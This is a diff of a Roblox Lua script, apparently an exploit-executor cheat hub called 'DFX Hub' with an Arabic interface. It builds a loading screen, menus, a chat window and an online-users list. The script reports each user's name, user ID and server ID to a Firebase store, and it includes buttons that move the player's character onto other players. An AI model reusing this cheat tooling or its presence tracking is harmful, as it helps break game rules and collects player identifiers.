+    task.spawn(function()
+        pcall(function()
+            local snd = Instance.new("Sound")
+            snd.SoundId = soundId
+            snd.Volume = volume or 0.35
+            snd.Pitch = pitch or 1
+            snd.Parent = SoundService
+            if not snd.IsLoaded then snd.Loaded:Wait() end
+            snd:Play()
+            snd.Ended:Connect(function() snd:Destroy() end)
+        end)
+    end)
+end
+
+playUiSound(SOUND_OPEN, 1, 1)
+
 task.spawn(function()
     while true do
         pcall(function()
-            local userUrl = FIREBASE_PRESENCE_URL .. "/" .. tostring(LocalPlayer.UserId) .. ".json"
             customRequest({
-                Url = userUrl,
+                Url = FIREBASE_BASE_URL .. "/active_users/" .. tostring(LocalPlayer.UserId) .. ".json",
                 Method = "PUT",
                 Headers = {["Content-Type"] = "application/json"},
                 Body = HttpService:JSONEncode({
-                    userId = LocalPlayer.UserId,
                     name = LocalPlayer.Name,
-                    displayName = LocalPlayer.DisplayName ~= "" and LocalPlayer.DisplayName or LocalPlayer.Name,
-                    jobId = game.JobId,
+                    displayName = LocalPlayer.DisplayName,
+                    userId = LocalPlayer.UserId,
                     placeId = game.PlaceId,
-                    time = os.time()
+                    jobId = game.JobId,
+                    lastSeen = os.time()
                 })
             })
         end)
@@ -652,90 +160,520 @@ task.spawn(function()
     end
 end)
 
-local function updateActiveUsersList()
+local function loadAvatarThumbnail(userId, imageLabel)
+    task.spawn(function()
+        pcall(function()
+            local content, isLoaded = Players:GetUserThumbnailAsync(userId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size150x150)
+            if isLoaded and imageLabel and imageLabel.Parent then
+                imageLabel.Image = content
+            end
+        end)
+    end)
+end
+
+---------------------------------------------------------
+-- شاشة التحميل (مع صورة سكن اللاعب)
+---------------------------------------------------------
+local LoadingGui = Instance.new("ScreenGui")
+LoadingGui.Name = "DFXLoadingGui"
+LoadingGui.ResetOnSpawn = false
+LoadingGui.Parent = parent
+
+local LoadFrame = Instance.new("Frame")
+LoadFrame.Size = UDim2.new(0, 320, 0, 190)
+LoadFrame.Position = UDim2.new(0.5, -160, 0.5, -95)
+LoadFrame.BackgroundColor3 = Color3.fromRGB(12, 18, 30)
+LoadFrame.BorderSizePixel = 0
+LoadFrame.Parent = LoadingGui
+Instance.new("UICorner", LoadFrame).CornerRadius = UDim.new(0, 14)
+
+local loadStroke = Instance.new("UIStroke")
+loadStroke.Color = currentAccentColor
+loadStroke.Thickness = 2.5
+loadStroke.Parent = LoadFrame
+
+local AvatarLoadImg = Instance.new("ImageLabel")
+AvatarLoadImg.Size = UDim2.new(0, 55, 0, 55)
+AvatarLoadImg.Position = UDim2.new(0.5, -27.5, 0, 12)
+AvatarLoadImg.BackgroundColor3 = Color3.fromRGB(20, 30, 50)
+AvatarLoadImg.ZIndex = 2
+AvatarLoadImg.Parent = LoadFrame
+Instance.new("UICorner", AvatarLoadImg).CornerRadius = UDim.new(0, 28)
+loadAvatarThumbnail(LocalPlayer.UserId, AvatarLoadImg)
+
+local LoadTitle = Instance.new("TextLabel")
+LoadTitle.Size = UDim2.new(1, 0, 0, 25)
+LoadTitle.Position = UDim2.new(0, 0, 0, 72)
+LoadTitle.BackgroundTransparency = 1
+LoadTitle.Text = "⚡ DFX HUB ⚡"
+LoadTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+LoadTitle.Font = Enum.Font.FredokaOne
+LoadTitle.TextSize = 20
+LoadTitle.Parent = LoadFrame
+
+local LoadSub = Instance.new("TextLabel")
+LoadSub.Size = UDim2.new(1, 0, 0, 20)
+LoadSub.Position = UDim2.new(0, 0, 0, 98)
+LoadSub.BackgroundTransparency = 1
+LoadSub.Text = "أهلاً بك " .. LocalPlayer.DisplayName .. "! جاري إعداد السكربت..."
+LoadSub.TextColor3 = Color3.fromRGB(180, 220, 255)
+LoadSub.Font = Enum.Font.FredokaOne
+LoadSub.TextSize = 12
+LoadSub.Parent = LoadFrame
+
+local BarBg = Instance.new("Frame")
+BarBg.Size = UDim2.new(0.85, 0, 0, 10)
+BarBg.Position = UDim2.new(0.075, 0, 0, 132)
+BarBg.BackgroundColor3 = Color3.fromRGB(20, 30, 50)
+BarBg.Parent = LoadFrame
+Instance.new("UICorner", BarBg).CornerRadius = UDim.new(0, 5)
+
+local BarFill = Instance.new("Frame")
+BarFill.Size = UDim2.new(0, 0, 1, 0)
+BarFill.BackgroundColor3 = currentAccentColor
+BarFill.Parent = BarBg
+Instance.new("UICorner", BarFill).CornerRadius = UDim.new(0, 5)
+
+---------------------------------------------------------
+-- الهيكل الرئيسي للواجهة
+---------------------------------------------------------
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "DFXProV28UI"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = parent
+
+local MainFrame = Instance.new("Frame")
+MainFrame.Name = "MainFrame"
+MainFrame.Size = UDim2.new(0, 560, 0, 360)
+MainFrame.Position = UDim2.new(0.5, -280, 0.5, -180)
+MainFrame.BackgroundTransparency = 1
+MainFrame.Active = true
+MainFrame.Draggable = true
+MainFrame.Visible = false
+MainFrame.Parent = ScreenGui
+
+local CenterBox = Instance.new("Frame")
+CenterBox.Name = "CenterBox"
+CenterBox.Size = UDim2.new(0, 340, 1, 0)
+CenterBox.Position = UDim2.new(0.5, -170, 0, 0)
+CenterBox.BackgroundColor3 = Color3.fromRGB(12, 18, 28)
+CenterBox.BackgroundTransparency = 0
+CenterBox.BorderSizePixel = 0
+CenterBox.ClipsDescendants = true
+CenterBox.Parent = MainFrame
+Instance.new("UICorner", CenterBox).CornerRadius = UDim.new(0, 10)
+
+local BgImage = Instance.new("ImageLabel")
+BgImage.Name = "BgImage"
+BgImage.Size = UDim2.new(1, 0, 1, 0)
+BgImage.BackgroundTransparency = 1
+BgImage.Visible = false
+BgImage.ScaleType = Enum.ScaleType.Crop
+BgImage.ZIndex = 0
+BgImage.Parent = CenterBox
+Instance.new("UICorner", BgImage).CornerRadius = UDim.new(0, 10)
+
+local centerStroke = Instance.new("UIStroke")
+centerStroke.Color = currentAccentColor
+centerStroke.Thickness = 3.5
+centerStroke.Parent = CenterBox
+
+local centerNeonGradient = Instance.new("UIGradient")
+centerNeonGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
+    ColorSequenceKeypoint.new(0.5, currentAccentColor),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))
+})
+centerNeonGradient.Parent = centerStroke
+
+task.spawn(function()
+    local rot = 0
+    while true do
+        rot = (rot + neonSpeed) % 360
+        centerNeonGradient.Rotation = rot
+        task.wait(0.015)
+    end
+end)
+
+local Header = Instance.new("Frame")
+Header.Size = UDim2.new(1, 0, 0, 42)
+Header.BackgroundColor3 = currentHeaderColor
+Header.BorderSizePixel = 0
+Header.ZIndex = 3
+Header.Parent = CenterBox
+Instance.new("UICorner", Header).CornerRadius = UDim.new(0, 10)
+
+local TitleMain = Instance.new("TextLabel")
+TitleMain.Size = UDim2.new(1, -75, 1, 0)
+TitleMain.Position = UDim2.new(0, 10, 0, 0)
+TitleMain.BackgroundTransparency = 1
+TitleMain.Text = "⚡ DFX Hub | المطور: طحبح"
+TitleMain.TextColor3 = Color3.fromRGB(255, 255, 255)
+TitleMain.Font = Enum.Font.FredokaOne
+TitleMain.TextSize = 18
+TitleMain.TextXAlignment = Enum.TextXAlignment.Center
+TitleMain.ZIndex = 4
+TitleMain.Parent = Header
+
+-- زر التصغير (-)
+local MinimizeBtn = Instance.new("TextButton")
+MinimizeBtn.Name = "MinimizeBtn"
+MinimizeBtn.Size = UDim2.new(0, 26, 0, 26)
+MinimizeBtn.Position = UDim2.new(1, -62, 0, 8)
+MinimizeBtn.BackgroundColor3 = Color3.fromRGB(40, 120, 220)
+MinimizeBtn.Text = "–"
+MinimizeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+MinimizeBtn.Font = Enum.Font.FredokaOne
+MinimizeBtn.TextSize = 20
+MinimizeBtn.ZIndex = 4
+MinimizeBtn.Parent = Header
+Instance.new("UICorner", MinimizeBtn).CornerRadius = UDim.new(0, 6)
+
+-- زر الإغلاق (✕)
+local CloseBtn = Instance.new("TextButton")
+CloseBtn.Name = "CloseBtn"
+CloseBtn.Size = UDim2.new(0, 26, 0, 26)
+CloseBtn.Position = UDim2.new(1, -32, 0, 8)
+CloseBtn.BackgroundColor3 = Color3.fromRGB(220, 40, 80)
+CloseBtn.Text = "✕"
+CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseBtn.Font = Enum.Font.FredokaOne
+CloseBtn.TextSize = 16
+CloseBtn.ZIndex = 4
+CloseBtn.Parent = Header
+Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 6)
+
+---------------------------------------------------------
+-- الفقاعة المربعة القابلة للسحب عند التصغير
+---------------------------------------------------------
+local FloatingMinBox = Instance.new("ImageButton")
+FloatingMinBox.Name = "DFXFloatingMinBox"
+FloatingMinBox.Size = UDim2.new(0, 52, 0, 52)
+FloatingMinBox.Position = UDim2.new(0, 20, 0.5, -26)
+FloatingMinBox.BackgroundColor3 = Color3.fromRGB(15, 25, 45)
+FloatingMinBox.Image = MINIMIZE_ICON_IMAGE
+FloatingMinBox.ScaleType = Enum.ScaleType.Crop
+FloatingMinBox.Active = true
+FloatingMinBox.Draggable = true
+FloatingMinBox.Visible = false
+FloatingMinBox.ZIndex = 100
+FloatingMinBox.Parent = ScreenGui
+Instance.new("UICorner", FloatingMinBox).CornerRadius = UDim.new(0, 12)
+
+local minBoxStroke = Instance.new("UIStroke")
+minBoxStroke.Color = currentAccentColor
+minBoxStroke.Thickness = 2.5
+minBoxStroke.Parent = FloatingMinBox
+
+local minNeonGradient = Instance.new("UIGradient")
+minNeonGradient.Color = centerNeonGradient.Color
+minNeonGradient.Parent = minBoxStroke
+
+task.spawn(function()
+    local rot = 0
+    while true do
+        rot = (rot + neonSpeed) % 360
+        minNeonGradient.Rotation = rot
+        task.wait(0.015)
+    end
+end)
+
+MinimizeBtn.MouseButton1Click:Connect(function()
+    playUiSound(SOUND_CLICK, 1, 0.35)
+    TweenService:Create(MainFrame, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
+        Size = UDim2.new(0, 0, 0, 0)
+    }):Play()
+    task.wait(0.3)
+    MainFrame.Visible = false
+    FloatingMinBox.Visible = true
+end)
+
+FloatingMinBox.MouseButton1Click:Connect(function()
+    playUiSound(SOUND_CLICK, 1, 0.35)
+    FloatingMinBox.Visible = false
+    MainFrame.Visible = true
+    MainFrame.Size = UDim2.new(0, 0, 0, 0)
+    TweenService:Create(MainFrame, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+        Size = UDim2.new(0, 560, 0, 360)
+    }):Play()
+end)
+
+---------------------------------------------------------
+-- بقية أجنحة وقوائم الواجهة
+---------------------------------------------------------
+local LeftWing = Instance.new("Frame")
+LeftWing.Size = UDim2.new(0, 105, 1, -48)
+LeftWing.Position = UDim2.new(0.5, -280, 0, 48)
+LeftWing.BackgroundTransparency = 1
+LeftWing.Parent = MainFrame
+
+local LeftLayout = Instance.new("UIListLayout")
+LeftLayout.Padding = UDim.new(0, 7)
+LeftLayout.Parent = LeftWing
+
+local RightWing = Instance.new("Frame")
+RightWing.Size = UDim2.new(0, 105, 1, -48)
+RightWing.Position = UDim2.new(0.5, 175, 0, 48)
+RightWing.BackgroundTransparency = 1
+RightWing.Parent = MainFrame
+
+local RightLayout = Instance.new("UIListLayout")
+RightLayout.Padding = UDim.new(0, 7)
+RightLayout.Parent = RightWing
+
+local CenterScroll = Instance.new("ScrollingFrame")
+CenterScroll.Size = UDim2.new(1, -16, 1, -54)
+CenterScroll.Position = UDim2.new(0, 8, 0, 48)
+CenterScroll.BackgroundTransparency = 1
+CenterScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
+CenterScroll.ScrollBarThickness = 4
+CenterScroll.ZIndex = 3
+CenterScroll.Parent = CenterBox
+
+local CenterLayout = Instance.new("UIListLayout")
+CenterLayout.SortOrder = Enum.SortOrder.LayoutOrder
+CenterLayout.Padding = UDim.new(0, 8)
+CenterLayout.Parent = CenterScroll
+
+---------------------------------------------------------
+-- نافذة الشات المباشرة
+---------------------------------------------------------
+local ChatScreenGui = Instance.new("ScreenGui")
+ChatScreenGui.Name = "DFXTopChatGui"
+ChatScreenGui.ResetOnSpawn = false
+ChatScreenGui.Parent = parent
+
+local FloatingChatBtn = Instance.new("TextButton")
+FloatingChatBtn.Name = "FloatingChatBtn"
+FloatingChatBtn.Size = UDim2.new(0, 40, 0, 40)
+FloatingChatBtn.Position = UDim2.new(0, 115, 0, 10)
+FloatingChatBtn.BackgroundColor3 = Color3.fromRGB(15, 25, 45)
+FloatingChatBtn.Text = "💬"
+FloatingChatBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+FloatingChatBtn.Font = Enum.Font.FredokaOne
+FloatingChatBtn.TextSize = 20
+FloatingChatBtn.Active = true
+FloatingChatBtn.Draggable = true
+FloatingChatBtn.Parent = ChatScreenGui
+Instance.new("UICorner", FloatingChatBtn).CornerRadius = UDim.new(0, 10)
+
+local ChatWin = Instance.new("Frame")
+ChatWin.Name = "ChatWin"
+ChatWin.Size = UDim2.new(0, 350, 0, 275)
+ChatWin.Position = UDim2.new(0, 160, 0, 10)
+ChatWin.BackgroundColor3 = Color3.fromRGB(10, 16, 28)
+ChatWin.ClipsDescendants = true
+ChatWin.Active = true
+ChatWin.Draggable = true
+ChatWin.Visible = false
+ChatWin.Parent = ChatScreenGui
+Instance.new("UICorner", ChatWin).CornerRadius = UDim.new(0, 12)
+
+local ChatBgImage = Instance.new("ImageLabel")
+ChatBgImage.Size = UDim2.new(1, 0, 1, 0)
+ChatBgImage.BackgroundTransparency = 1
+ChatBgImage.Visible = false
+ChatBgImage.ScaleType = Enum.ScaleType.Crop
+ChatBgImage.ZIndex = 0
+ChatBgImage.Parent = ChatWin
+Instance.new("UICorner", ChatBgImage).CornerRadius = UDim.new(0, 12)
+
+local floatStroke = Instance.new("UIStroke")
+floatStroke.Color = currentAccentColor
+floatStroke.Thickness = 2
+floatStroke.Parent = FloatingChatBtn
+
+local chatStroke = Instance.new("UIStroke")
+chatStroke.Color = currentAccentColor
+chatStroke.Thickness = 3.5
+chatStroke.Parent = ChatWin
+
+local chatNeonGradient = Instance.new("UIGradient")
+chatNeonGradient.Color = centerNeonGradient.Color
+chatNeonGradient.Parent = chatStroke
+
+task.spawn(function()
+    local rot = 0
+    while true do
+        rot = (rot + neonSpeed) % 360
+        chatNeonGradient.Rotation = rot
+        task.wait(0.015)
+    end
+end)
+
+local ResetTimerLbl = Instance.new("TextLabel")
+ResetTimerLbl.Size = UDim2.new(1, -20, 0, 16)
+ResetTimerLbl.Position = UDim2.new(0, 10, 0, 6)
+ResetTimerLbl.BackgroundTransparency = 1
+ResetTimerLbl.Text = "⏱️ التصفير التلقائي: 05:00"
+ResetTimerLbl.TextColor3 = Color3.fromRGB(255, 200, 80)
+ResetTimerLbl.Font = Enum.Font.FredokaOne
+ResetTimerLbl.TextSize = 11
+ResetTimerLbl.TextXAlignment = Enum.TextXAlignment.Center
+ResetTimerLbl.ZIndex = 3
+ResetTimerLbl.Parent = ChatWin
+
+local ChatHeaderBtn1 = Instance.new("TextButton")
+ChatHeaderBtn1.Size = UDim2.new(0, 85, 0, 24)
+ChatHeaderBtn1.Position = UDim2.new(0, 6, 0, 25)
+ChatHeaderBtn1.BackgroundColor3 = currentAccentColor
+ChatHeaderBtn1.Text = "💬 الشات"
+ChatHeaderBtn1.TextColor3 = Color3.fromRGB(255, 255, 255)
+ChatHeaderBtn1.Font = Enum.Font.FredokaOne
+ChatHeaderBtn1.TextSize = 11
+ChatHeaderBtn1.ZIndex = 2
+ChatHeaderBtn1.Parent = ChatWin
+Instance.new("UICorner", ChatHeaderBtn1).CornerRadius = UDim.new(0, 6)
+
+local ChatHeaderBtn2 = Instance.new("TextButton")
+ChatHeaderBtn2.Size = UDim2.new(0, 75, 0, 24)
+ChatHeaderBtn2.Position = UDim2.new(0, 95, 0, 25)
+ChatHeaderBtn2.BackgroundColor3 = currentAccentColor
+ChatHeaderBtn2.Text = "★ مميزات"
+ChatHeaderBtn2.TextColor3 = Color3.fromRGB(255, 255, 255)
+ChatHeaderBtn2.Font = Enum.Font.FredokaOne
+ChatHeaderBtn2.TextSize = 11
+ChatHeaderBtn2.ZIndex = 2
+ChatHeaderBtn2.Parent = ChatWin
+Instance.new("UICorner", ChatHeaderBtn2).CornerRadius = UDim.new(0, 6)
+
+local ChatHeaderBtn3 = Instance.new("TextButton")
+ChatHeaderBtn3.Size = UDim2.new(0, 130, 0, 24)
+ChatHeaderBtn3.Position = UDim2.new(0, 174, 0, 25)
+ChatHeaderBtn3.BackgroundColor3 = currentAccentColor
+ChatHeaderBtn3.Text = "👥 المتواجدون (0)"
+ChatHeaderBtn3.TextColor3 = Color3.fromRGB(255, 255, 255)
+ChatHeaderBtn3.Font = Enum.Font.FredokaOne
+ChatHeaderBtn3.TextSize = 11
+ChatHeaderBtn3.ZIndex = 2
+ChatHeaderBtn3.Parent = ChatWin
+Instance.new("UICorner", ChatHeaderBtn3).CornerRadius = UDim.new(0, 6)
+
+local ChatMainContainer = Instance.new("Frame")
+ChatMainContainer.Size = UDim2.new(1, 0, 1, -60)
+ChatMainContainer.Position = UDim2.new(0, 0, 0, 55)
+ChatMainContainer.BackgroundTransparency = 1
+ChatMainContainer.ZIndex = 2
+ChatMainContainer.Parent = ChatWin
+
+local ChatFeaturesContainer = Instance.new("ScrollingFrame")
+ChatFeaturesContainer.Size = UDim2.new(1, -20, 1, -70)
+ChatFeaturesContainer.Position = UDim2.new(0, 10, 0, 58)
+ChatFeaturesContainer.BackgroundTransparency = 1
+ChatFeaturesContainer.Visible = false
+ChatFeaturesContainer.ZIndex = 2
+ChatFeaturesContainer.ScrollBarThickness = 3
+ChatFeaturesContainer.Parent = ChatWin
+
+local featLayout = Instance.new("UIListLayout")
+featLayout.Padding = UDim.new(0, 8)
+featLayout.Parent = ChatFeaturesContainer
+
+local ChatOnlineContainer = Instance.new("ScrollingFrame")
+ChatOnlineContainer.Size = UDim2.new(1, -20, 1, -70)
+ChatOnlineContainer.Position = UDim2.new(0, 10, 0, 58)
+ChatOnlineContainer.BackgroundTransparency = 1
+ChatOnlineContainer.Visible = false
+ChatOnlineContainer.ZIndex = 2
+ChatOnlineContainer.ScrollBarThickness = 3
+ChatOnlineContainer.Parent = ChatWin
+
+local onlineLayout = Instance.new("UIListLayout")
+onlineLayout.Padding = UDim.new(0, 6)
+onlineLayout.Parent = ChatOnlineContainer
+
+local function fetchScriptUsersOnly()
     pcall(function()
-        local res = customRequest({Url = FIREBASE_PRESENCE_URL .. ".json", Method = "GET"})
-        if res and res.StatusCode == 200 and res.Body ~= "" and res.Body ~= "null" then
-            local data = HttpService:JSONDecode(res.Body)
+        local res = customRequest({Url = FIREBASE_USERS_URL, Method = "GET"})
+        if res and res.StatusCode == 200 then
+            local data = safeDecode(res.Body)
             if data then
-                for _, child in ipairs(UsersScroll:GetChildren()) do
-                    if child:IsA("Frame") then child:Destroy() end
-                end
-
-                local count = 0
-                local now = os.time()
-
-                for _, usr in pairs(data) do
-                    if type(usr) == "table" and usr.time and (now - usr.time < 35) then
-                        count = count + 1
-
-                        local uCard = Instance.new("Frame")
-                        uCard.Size = UDim2.new(1, -6, 0, 42)
-                        uCard.BackgroundColor3 = Color3.fromRGB(24, 24, 34)
-                        uCard.ZIndex = 1012
-                        uCard.Parent = UsersScroll
-                        Instance.new("UICorner", uCard).CornerRadius = UDim.new(0, 6)
-
-                        local uCardStroke = Instance.new("UIStroke")
-                        uCardStroke.Color = Color3.fromRGB(50, 50, 70)
-                        uCardStroke.Thickness = 1
-                        uCardStroke.Parent = uCard
-
-                        local uImg = Instance.new("ImageLabel")
-                        uImg.Size = UDim2.new(0, 32, 0, 32)
-                        uImg.Position = UDim2.new(0, 5, 0.5, -16)
-                        uImg.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
-                        uImg.Image = "rbxthumb://type=AvatarHeadShot&id=" .. tostring(usr.userId or 1) .. "&w=150&h=150"
-                        uImg.ZIndex = 1013
-                        uImg.Parent = uCard
-                        Instance.new("UICorner", uImg).CornerRadius = UDim.new(1, 0)
-
-                        local uLbl = Instance.new("TextLabel")
-                        uLbl.Size = UDim2.new(1, -120, 1, 0)
-                        uLbl.Position = UDim2.new(0, 42, 0, 0)
-                        uLbl.BackgroundTransparency = 1
-                        uLbl.Text = usr.displayName or usr.name or "مستخدم"
-                        uLbl.TextColor3 = Color3.fromRGB(255, 215, 0)
-                        uLbl.Font = Enum.Font.SourceSansBold
-                        uLbl.TextSize = 12
-                        uLbl.TextXAlignment = Enum.TextXAlignment.Left
-                        uLbl.ZIndex = 1013
-                        uLbl.Parent = uCard
-
-                        local joinBtn = Instance.new("TextButton")
-                        joinBtn.Size = UDim2.new(0, 68, 0, 26)
-                        joinBtn.Position = UDim2.new(1, -74, 0.5, -13)
-                        joinBtn.BackgroundColor3 = Color3.fromRGB(40, 140, 60)
-                        joinBtn.Text = "انتقال ✈"
-                        joinBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-                        joinBtn.Font = Enum.Font.SourceSansBold
-                        joinBtn.TextSize = 10.5
-                        joinBtn.ZIndex = 1013
-                        joinBtn.Parent = uCard
-                        Instance.new("UICorner", joinBtn).CornerRadius = UDim.new(0, 5)
-
-                        joinBtn.MouseButton1Click:Connect(function()
-                            if usr.jobId == game.JobId then
-                                joinBtn.Text = "أنت هنا!"
-                                task.wait(1.5)
-                                joinBtn.Text = "انتقال ✈"
-                            else
-                                joinBtn.Text = "جارٍ..."
-                                local success = pcall(function()
-                                    TeleportService:TeleportToPlaceInstance(usr.placeId or game.PlaceId, usr.jobId, LocalPlayer)
-                                end)
-                                if not success then
-                                    joinBtn.Text = "❌ ممتلئ"
-                                    task.wait(2)
-                                    joinBtn.Text = "انتقال ✈"
-                                end
-                            end
-                        end)
+                local activeUsers = {}
+                local currentTime = os.time()
+                
+                for uid, uData in pairs(data) do
+                    if type(uData) == "table" and uData.lastSeen and (currentTime - uData.lastSeen) < 35 then
+                        table.insert(activeUsers, uData)
                     end
                 end
+                
+                ChatHeaderBtn3.Text = "👥 المتواجدون (" .. #activeUsers .. ")"
+                
+                for _, child in ipairs(ChatOnlineContainer:GetChildren()) do
+                    if not child:IsA("UIListLayout") then child:Destroy() end
+                end
+                
+                for _, u in ipairs(activeUsers) do
+                    local pFrame = Instance.new("Frame")
+                    pFrame.Size = UDim2.new(1, 0, 0, 46)
+                    pFrame.BackgroundColor3 = Color3.fromRGB(16, 26, 46)
+                    pFrame.ZIndex = 3
+                    pFrame.Parent = ChatOnlineContainer
+                    Instance.new("UICorner", pFrame).CornerRadius = UDim.new(0, 6)
 
-                ActiveCountLbl.Text = "🟢 المتواجدون الآن: " .. tostring(count)
-                UsersScroll.CanvasSize = UDim2.new(0, 0, 0, UsersLayout.AbsoluteContentSize.Y + 10)
+                    local pImg = Instance.new("ImageLabel")
+                    pImg.Size = UDim2.new(0, 34, 0, 34)
+                    pImg.Position = UDim2.new(1, -40, 0.5, -17)
+                    pImg.BackgroundColor3 = Color3.fromRGB(25, 40, 70)
+                    pImg.ZIndex = 4
+                    pImg.Parent = pFrame
+                    Instance.new("UICorner", pImg).CornerRadius = UDim.new(0, 17)
+                    
+                    loadAvatarThumbnail(u.userId, pImg)
+
+                    local pNameLbl = Instance.new("TextLabel")
+                    pNameLbl.Size = UDim2.new(1, -190, 1, 0)
+                    pNameLbl.Position = UDim2.new(0, 140, 0, 0)
+                    pNameLbl.BackgroundTransparency = 1
+                    pNameLbl.Text = "★ " .. (u.displayName or u.name)
+                    pNameLbl.TextColor3 = currentAccentColor
+                    pNameLbl.Font = Enum.Font.FredokaOne
+                    pNameLbl.TextSize = 13
+                    pNameLbl.TextXAlignment = Enum.TextXAlignment.Right
+                    pNameLbl.ZIndex = 4
+                    pNameLbl.Parent = pFrame
+                    table.insert(activeNameLabels, pNameLbl)
+
+                    local viewBtn = Instance.new("TextButton")
+                    viewBtn.Size = UDim2.new(0, 60, 0, 26)
+                    viewBtn.Position = UDim2.new(0, 72, 0.5, -13)
+                    viewBtn.BackgroundColor3 = currentAccentColor
+                    viewBtn.Text = "تتبع 👀"
+                    viewBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+                    viewBtn.Font = Enum.Font.FredokaOne
+                    viewBtn.TextSize = 11
+                    viewBtn.ZIndex = 4
+                    viewBtn.Parent = pFrame
+                    Instance.new("UICorner", viewBtn).CornerRadius = UDim.new(0, 5)
+
+                    local tpBtn = Instance.new("TextButton")
+                    tpBtn.Size = UDim2.new(0, 60, 0, 26)
+                    tpBtn.Position = UDim2.new(0, 6, 0.5, -13)
+                    tpBtn.BackgroundColor3 = Color3.fromRGB(0, 180, 120)
+                    tpBtn.Text = "انتقال 🚀"
+                    tpBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+                    tpBtn.Font = Enum.Font.FredokaOne
+                    tpBtn.TextSize = 11
+                    tpBtn.ZIndex = 4
+                    tpBtn.Parent = pFrame
+                    Instance.new("UICorner", tpBtn).CornerRadius = UDim.new(0, 5)
+
+                    viewBtn.MouseButton1Click:Connect(function()
+                        playUiSound(SOUND_CLICK, 1, 0.35)
+                        local targetPlr = Players:GetPlayerByUserId(u.userId)
+                        if targetPlr and targetPlr.Character and targetPlr.Character:FindFirstChild("HumanoidRootPart") then
+                            LocalPlayer.Character.HumanoidRootPart.CFrame = targetPlr.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
+                        end
+                    end)
+
+                    tpBtn.MouseButton1Click:Connect(function()
+                        playUiSound(SOUND_CLICK, 1, 0.35)
+                        if u.placeId and u.jobId then
+                            TeleportService:TeleportToPlaceInstance(u.placeId, u.jobId, LocalPlayer)
+                        end
+                    end)
+                end
+                ChatOnlineContainer.CanvasSize = UDim2.new(0, 0, 0, onlineLayout.AbsoluteContentSize.Y + 15)
             end
         end
     end)
@@ -743,1012 +681,1178 @@ end
 
 task.spawn(function()
     while true do
-        if FeaturesModal.Visible then
-            updateActiveUsersList()
-        end
-        task.wait(4)
+        fetchScriptUsersOnly()
+        task.wait(5)
     end
 end)
 
--- دورة المزامنة والريست العالمي كل 30 دقيقة (1800 ثانية)
+ChatHeaderBtn1.MouseButton1Click:Connect(function()
+    playUiSound(SOUND_CLICK, 1, 0.35)
+    ChatMainContainer.Visible = true
+    ChatFeaturesContainer.Visible = false
+    ChatOnlineContainer.Visible = false
+end)
+
+ChatHeaderBtn2.MouseButton1Click:Connect(function()
+    playUiSound(SOUND_CLICK, 1, 0.35)
+    ChatMainContainer.Visible = false
+    ChatFeaturesContainer.Visible = true
+    ChatOnlineContainer.Visible = false
+end)
+
+ChatHeaderBtn3.MouseButton1Click:Connect(function()
+    playUiSound(SOUND_CLICK, 1, 0.35)
+    ChatMainContainer.Visible = false
+    ChatFeaturesContainer.Visible = false
+    ChatOnlineContainer.Visible = true
+    fetchScriptUsersOnly()
+end)
+
+---------------------------------------------------------
+-- إدارة الخلفيات
+---------------------------------------------------------
+local function applyScriptBackground(idx)
+    selectedScriptBgIndex = idx
+    saveUserSettings()
+    if idx > 0 and wallUrls[idx] then
+        BgImage.Image = wallUrls[idx]
+        BgImage.Visible = true
+        CenterBox.BackgroundTransparency = 0.85
+    else
+        BgImage.Visible = false
+        CenterBox.BackgroundTransparency = 0
+    end
+end
+
+local function applyChatBackground(idx)
+    selectedChatBgIndex = idx
+    saveUserSettings()
+    if idx > 0 and wallUrls[idx] then
+        ChatBgImage.Image = wallUrls[idx]
+        ChatBgImage.Visible = true
+        ChatWin.BackgroundTransparency = 0.85
+    else
+        ChatBgImage.Visible = false
+        ChatWin.BackgroundTransparency = 0
+    end
+end
+
+applyScriptBackground(selectedScriptBgIndex)
+applyChatBackground(selectedChatBgIndex)
+
+local chatFeatTitle = Instance.new("TextLabel")
+chatFeatTitle.Size = UDim2.new(1, 0, 0, 25)
+chatFeatTitle.BackgroundTransparency = 1
+chatFeatTitle.Text = "🖼️ تخصيص خلفية الشات المباشر"
+chatFeatTitle.TextColor3 = currentAccentColor
+chatFeatTitle.Font = Enum.Font.FredokaOne
+chatFeatTitle.TextSize = 13
+chatFeatTitle.ZIndex = 3
+chatFeatTitle.Parent = ChatFeaturesContainer
+table.insert(activeNameLabels, chatFeatTitle)
+
+local removeChatBgBtn = Instance.new("TextButton")
+removeChatBgBtn.Size = UDim2.new(1, 0, 0, 28)
+removeChatBgBtn.BackgroundColor3 = Color3.fromRGB(180, 40, 60)
+removeChatBgBtn.Text = "❌ إغلاق خلفية الشات"
+removeChatBgBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+removeChatBgBtn.Font = Enum.Font.FredokaOne
+removeChatBgBtn.TextSize = 12
+removeChatBgBtn.ZIndex = 3
+removeChatBgBtn.Parent = ChatFeaturesContainer
+Instance.new("UICorner", removeChatBgBtn).CornerRadius = UDim.new(0, 6)
+
+removeChatBgBtn.MouseButton1Click:Connect(function()
+    playUiSound(SOUND_CLICK, 1, 0.35)
+    applyChatBackground(0)
+end)
+
+local chatGridHolder = Instance.new("Frame")
+chatGridHolder.Size = UDim2.new(1, 0, 0, 360)
+chatGridHolder.BackgroundTransparency = 1
+chatGridHolder.ZIndex = 3
+chatGridHolder.Parent = ChatFeaturesContainer
+
+local chatGridLayout = Instance.new("UIGridLayout")
+chatGridLayout.CellSize = UDim2.new(0, 140, 0, 75)
+chatGridLayout.CellPadding = UDim2.new(0, 10, 0, 10)
